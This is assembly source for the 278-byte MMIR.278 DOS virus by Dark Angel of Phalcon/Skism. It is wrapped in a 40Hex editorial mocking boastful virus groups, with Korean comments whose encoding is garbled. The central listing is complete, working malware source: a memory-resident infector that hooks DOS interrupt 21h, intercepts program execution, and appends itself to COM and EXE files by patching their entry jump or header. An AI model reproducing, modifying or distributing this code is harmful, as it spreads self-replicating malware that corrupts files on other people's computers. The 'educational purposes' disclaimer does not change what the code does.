;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                                              \\\\\\\  \       \   \\\\\\\
;                                             \          \     \   \
;         MMIR.278                            \           \   \    \    98/05
;                                             \            \ \     \
;                                              \\\\\\\      \       \\\\\\\ #04
;
; Virus Name : MMIR.278
; Author     : Dark Angel
; Group      : Phalcon/Skism
; Origin     : USA
; Type       : Memory resident COM/EXE Infector
;
;  !*< ¤óŸI¸â ·¢ >********************************************************!
;   *                                                                        *
;   * ‰w‰¡ !                                                                 *
;   *        ·¡ ¸÷¥¡“e Ša·B¸â·¥ ¡¢¸â·a¡ e ¬a¶w–A´á´¡ Ðs“¡”a. ¶Ÿ¡“e ·¡      *
;   *        ¸÷¥¡Ÿi ¬a¶wÐ¬á ¤i¬—Ða“e ´á˜å ¢…¹AµA ”Ð¬á•¡ À‚·±·i »¡»¡ ´g    *
;   *        ¯s“¡”a. ¡¡—e À‚·±·e ‹i·i ·ª“e ¬aœqµA‰A ·¶¯s“¡”a.                *
;   *                                                                        *
;   * Warning !                                                              *
;   *        This information is for educational purposes only. We are       *
;   *        not responsible for any problems caused by the use of this      *
;   *        information. Responsibility is entirely placed on the reader    *
;   *                                                                        *
;   !************************************************************************!
;
; ·¡ ¤a·¡œá¯a“e PS · Dark Angel ·¡ ¹A¸bÐe ¤a·¡œá¯a¡ IVT µA ¬wºÐa¡e¬á COM/E
; XE Ìa·©·i ˆqµq ¯¡Ç© ® ·¶”a. Dark Angel ·e VX —iµA‰A ˆa¸w ¸i ´ia»¥ ¤a·¡œá¯a
; ¹A¸b¸a—i º—µA Ðe¡w·¡”a. Ða»¡ e, Ñe¸“e ¤a·¡œá¯a‰µA¬á ·eÊAÐeˆõ·a¡ ´ia¹a ·¶
; ”a. Ì‰Å¥¯aÇ¡»q µb¯¡ »¡‹q·e ÐÁA–E ¬wÈ·¡”a.
;
;comment *
;
;40Hex Issue 11 Volume 3 Number 2                                      File 001
;
;                        Life, the Universe, and 40Hex
;
;       It is apparent to even the blindest of observers that the virus
;  phenomenon has caught on.  Everyone and his kid brother has decided to start
;  a virus group, whether or not they have programmers capable of creating a
;  viable (read: parasitic) virus.  While this in itself is merely offensive,
;  it is the sheer arrogance of these meta-groups which is irritating.  Of
;  course, no names will be mentioned, as that would be mean and we all wish
;  for a happy world.
;       The most common trait of these pseudo-groups is for a member to state
;  that all code that was written was "developed on my own."  Of course, this
;  is seldom the case.  Often, the "original source code" to their viruses
;  clearly originated at some point from a Sourcer disassembly.  Heck, when you
;  see "seg_a" or "loc_0027," you know they're just poor hacks.  Of course, the
;  the disparate coding styles in the "source" also reveals the nature of the
;  virus.
;       And when the virus is listed as a Dark Avenger hack in various anti-
;  virus products, the individuals persist in their self-induced fantasies,
;  saying their viruses are original.  I suppose the anti-virus programmers,
;  who have disassembled countless viruses, can't spot a Dark Avenger or Murphy
;  hack when they see one.  Stop fooling yourselves.
;       And these mentally challenged persons continue, insisting routine X, a
;  "new, innovative technique," was developed independently.  Yet anyone with
;  even a minimal exposure to virus source code can see traces of other viruses
;  in these routines.  Even the ideas presented are seldom new; most having
;  already been implemented by existing viruses.  The worst of these people
;  magnify all of their supposed accomplishments, talking of the revolutionary
;  changes they single-handedly effect.
;       Every group goes through a phase in which they hack viruses; they
;  should not be proud of these viruses.  But it is merely the first step and
;  most grow out of it.  Skism-1, for example, was a Jerusalem hack.  It is
;  ancient history.  I might also point out that the Phalcon/Skism viruses
;  published in both the last issue and this one are far superior to Skism-1.
;  Phalcon/Skism does not release the source code to half-baked viruses just so
;  40Hex can look larger.  Every virus programmer has a few experimental
;  viruses; yet it is not necessarily appropriate to print all of them.  If I
;  wrote a virus which had several hundred bytes of repetitious code, I would
;  be ashamed to print it.  It's like releasing a program which has only been
;  half-completed.
;       When a virus programmer additionally claims, "This virus was written
;  two years ago, so it sucks, but I'm going to release it anyway because it's
;  good to learn from," I have my doubts.  When s/he further hurridly states,
;  "My other viruses are better," then my doubts grow.  Where, pray tell, are
;  these superior viruses?  Why publish that which you admit sucks?  Of course,
;  anyone that makes such a claim, or one such as, "Next time, I'll release a
;  COM/EXE/SYS/MBR/OV?/DAT/DOC/TXT/ANS/ASC polymorphic, stealth infector that I
;  wrote last week," is suspicious.
;       As an example of the mindless boasting, observe the following:  (Note:
;  the following should not be construed as a personal attack against either
;  the person or group in question.)
;       This person wrote, "As with many of my routines, stuff which took many
;  other virus writers a few pages of code took me one page... that's not bad!
;  I have many other goodies up my sleeve, like a 387-byte generic COM/EXE
;  parasitic infector on execution, the smallest of its kind in the WORLD...
;  (with room for improvement!)."
;       Please do not boast if you cannot substantiate your claims.  For
;  example, these claims are easily shredded by counterexample.  Let us examine
;  the Voronezh-370 virus.  It is a generic parasitic COM/EXE infector and it
;  is indeed less than 387 bytes.  If 387 bytes is the smallest in the world,
;  then this may very well be the smallest in the universe.  With only two
;  hours of fiddling, I came up with the following virus (278 bytes), which may
;  yet be the smallest of its kind in all of creation!  Actually, I make no
;  such claim, as a smaller one _can_ be written.  The point was to show that
;  this claim was not all that impressive and was, in fact, dead wrong.  Let us
;  not be o'erhasty to boast next time.
;       As with many of my viruses, stuff which took many other virus writers
;  over 380 bytes took me under 280... that's not bad!  Humour aside, I might
;  point out that this virus is _over_ 100 bytes less than the boaster's
;  attempt, so it is _significantly_ smaller.  Gee, I wonder what those extra
;  109 bytes are used for.
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>

;
;  -------------Cut here----------------
;*
          .model  tiny
          .code
          .radix  16
          .code
; Phalcon/Skism _Small virus
; Written by Dark Angel of Phalcon/Skism
; 278 byte generic COM/EXE infector
  EXE_ID          =       -40
  viruslength     =       heap - _small
  startload       =       90 * 4

  _small:
          call    relative                  ;
  oldheader       dw      020cdh
                  dw      0bh dup (0)
  relative:                                 ;
          pop     bp                        ; delta offset ŠÐa‹¡
          push    ds
          push    es
          xor     ax,ax
          mov     ds,ax
          mov     es,ax
          mov     di,startload              ;
          cmp     word ptr ds:[di+25],di
          jz      exit_small

          lea     si,[bp-3]                 ; ¤a·¡œá¯a ¥¢¬a
          mov     cx,viruslength
          db      2Eh
          rep     movsb

          mov     di,offset old21 + startload
          mov     si,21*4                   ; Int 21h ˆa¡À‹¡
          push    si
          movsw
          movsw
          pop     di
          mov     ax,offset int21 + startload
          stosw
          xchg    ax,cx
          stosw

  exit_small:
          pop     es
          pop     ds

          or      sp,sp                     ; COM/EXE ˆñ¬a
          jnp     returnCOM
  returnEXE:                                ; EXE ¥¢Š
          mov     ax,ds
          add     ax,10
          add     [bp+16],ax
          add     ax,[bp+0e]
          mov     ss,ax
          mov     sp,cs:[bp+10]
          jmp     dword ptr cs:[bp+14]
  returnCOM:                                ; COM ¥¢Š
          mov     di,100
          push    di
          mov     si,bp
          movsw
          movsb
          ret

  infect:
          push    ax
          push    bx
          push    cx
          push    dx
          push    si
          push    di
          push    ds
          push    es

          mov     ax,3d02                   ; µ¡Ïe
          int     21
          xchg    ax,bx

          push    cs
          pop     ds
          push    cs
          pop     es

          mov     si,offset oldheader+startload

          mov     ah,3f                     ; ·ª‹¡
          mov     cx,18
          push    cx
          mov     dx,si
          int     21

          cmp     ax,cx
          jnz     go_already_infected

          mov     di,offset target + startload
          push    di
          rep     movsb
          pop     di

          mov     ax,4202                   ; Ìa·© {·a¡ ·¡•·
          cwd
          int     21

          cmp     ds:[di],'ZM'              ; EXE Ìa·©·¥ˆa ?
          jz      infectEXE

          sub     ax,3                      ; COM Ìa·© ˆqµq
          mov     byte ptr ds:[di],0e9
          mov     ds:[di+1],ax

          sub     ax,viruslength
          cmp     ds:[si-17],ax             ; ˆqµqµa¦ˆñ¬a
          jnz     finishinfect
  go_already_infected:
          pop     cx
          jmp     short already_infected

  int21:
          cmp     ax,4b00                   ; ¯©Ð— ?
          jz      infect
          jmp     short chain

  infectEXE:
          cmp     word ptr [di+10],EXE_ID   ; EXE ˆqµqµa¦ ˆñ¬a
          jz      go_already_infected

          push    ax
          push    dx

          add     ax,viruslength            ; ¤a·¡œá¯a ‹©·¡ ”áÐa‹¡
          adc     dx,0

          mov     cx,200                    ; / 512
          div     cx

          or      dx,dx                     ; a á»¡ˆa ¹¥¸Ða“eˆa ?
          jz      nohiccup
          inc     ax
  nohiccup:
          mov     ds:[di+4],ax
          mov     ds:[di+2],dx

          pop     dx
          pop     ax

          mov     cx,10                     ;
          div     cx

          sub     ax,ds:[di+8]

          mov     ds:[di+14],dx             ;
          mov     ds:[di+16],ax             ;

          mov     ds:[di+0e],ax             ;
          mov     word ptr ds:[di+10],EXE_ID; ˆqµq µa¦ Îa¯¡
  finishinfect:
          mov     ah,40                     ; ¤a·¡œá¯a ³a‹¡
          mov     cx,viruslength
          mov     dx,startload
          int     21

          mov     ax,4200                   ; Àá·q·a¡ ·¡•·
          xor     cx,cx
          cwd
          int     21

          mov     ah,40                     ; ÑA”á ³a‹¡
          mov     dx,di
          pop     cx
          int     21
  already_infected:
          mov     ah,3e                     ; ”h‹¡
          int     21
  exitinfect:
          pop     es
          pop     ds
          pop     di
          pop     si
          pop     dx
          pop     cx
          pop     bx
          pop     ax
  chain:
          db      0ea
  heap:
  old21   dw      ?, ?
  target  dw      0ch dup (?)

  endheap:
          end     _small
;  -------------------------------------
;
;       I think the informed virus and anti-virus person recognises these
;  claims as the baseless boasts they are.  Let me assure you that you will see
;  none of that in 40Hex.
;       Finally, each new group proclaims to be the world's predominant virus
;  group.  Each new group puts out a magazine.  Each new group presents H/P/A
;  articles in their magazines.  Let us go through each one step by step.
;  Hacking.  Gee, can't you see the connection with viruses?  Phreaking.  Got
;  some c0deZ, d00d?  Anarchy.  Gee, I want total chaos even though I probably
;  couldn't survive such a situation.  H/P/A aside, these "virus magazines" do
;  indeed contain some virus-related articles.  Generally, these are of the
;  form "X virus is great, but we won't give source.  X does this, it does
;  that, it is not a hack of Dark Avenger even though it scans as such."  Some
;  articles give Sourcer disassemblies -- hardly commented, yet termed
;  disassemblies nonetheless.  Finally, there are the programming articles
;  containing tips and tricks from the "masters."  These often contain
;  nonworking code.  These often contain factual errors.  These often are
;  nothing but a waste of time.
;       Does this sound elitist?  I hope not.  Judge virus groups and their
;  magazines on their merits, not on their hype.  Do not take a virus group's
;  word as gospel; it seldom reflects the truth.  Instead, do some
;  investigation on your own and try to verify (or refute) their claims.  You
;  may be surprised at the results.  There is also no reason to immediately
;  condemn all anti-virus people as corrupt and "lame"; many are just ordinary
;  people "on the other side."  The virus scene is becoming less innovative as
;  these new quasi-groups emerge.  This apparent contradiction must end soon.
;  We ask all groups to end the self-back-patting and blatant lying and do some
;  real work.
;       Finally, a short summary of 40Hex is in order, for both new and old
;  readers alike.  The paragraphs below show the current editorial stance and
;  opinion of 40Hex, which has evolved during the several years of its
;  existence.  What holds true for 40Hex also applies to Phalcon/Skism.
;
;       40Hex is _not_ a magazine for self-congratulation.  Although put out by
;  Phalcon/Skism, 40Hex serves as medium through which the public may hear the
;  voice of the informed virus community without magnification of either the
;  achievements or failures of any particular virus group or programmer.
;  Although the 40Hex staff offers opinions from the pro-virus standpoint,
;  40Hex is not an anti-anti-virus magazine.  There is a clear distinction
;  between pro- and anti-anti-virus.  40Hex encourages anti-virus researchers
;  to contribute.  40Hex offers a fair, unbiased view except in editorials,
;  which obviously reflect the opinions of the authors.
;       40Hex _is_ purely a virus magazine -- none of that H/P/A/k-rad stuff.
;  Illegal and anarchistic activities are not condoned by 40Hex and, as such,
;  these topics are not appropriate for inclusion in the magazine.  The public
;  distribution of quality virus source code and virus writing techniques, both
;  old and new, is one of the predominant goals of 40Hex, serving to inform
;  both the pro- and anti-virus community.  The secondary function of the
;  magazine is to spread virus-related news.  40Hex is concerned more with
;  content than size.  You know the old saw "Quality, not quantity."  Other
;  magazines appear larger than they truly are because each article is padded
;  to 80 columns, effectively doubling its file length.
;       40Hex articles are _not_ mere rehashes of what has already been
;  printed.  Other magazines have presented articles which closely mirror those
;  already published in 40Hex.  Such poorly rewritten articles are neither
;  enlightening nor necessary.
;       40Hex is _not_ a tool with which people wreak havok upon others'
;  systems.  This is simply an unfair view of the magazine.  In fact, 40Hex is
;  against wanton destruction of computer systems.  Viruses are so prevalent
;  nowadays that anyone can obtain them with little difficulty.  They also need
;  not obtain 40Hex to be able to type "FORMAT C:"  Knobs will be knobs.
;       40Hex _is_ a public forum, allowing those who take the time to write to
;  have their opinions published.  We encourage all to send letters to 40Hex,
;  as they provide valuable insight into the virus and anti-virus communities
;  from a fresh perspective.
;       40Hex is _not_ inherently evil.  What you choose to do with the
;  knowledge provided is your business.
;
;       Once again, 40Hex does not condone the illegal spread of viruses.  Such
;  actions are frowned upon.  Our stance has evolved over the years, so don't
;  bring up something from 40Hex-2 and cry hippocrite -- unless, of course, you
;  have a closed mind and absolutely nothing else to say.
;
;                                                -- Dark Angel
;                                                   Phalcon/Skism

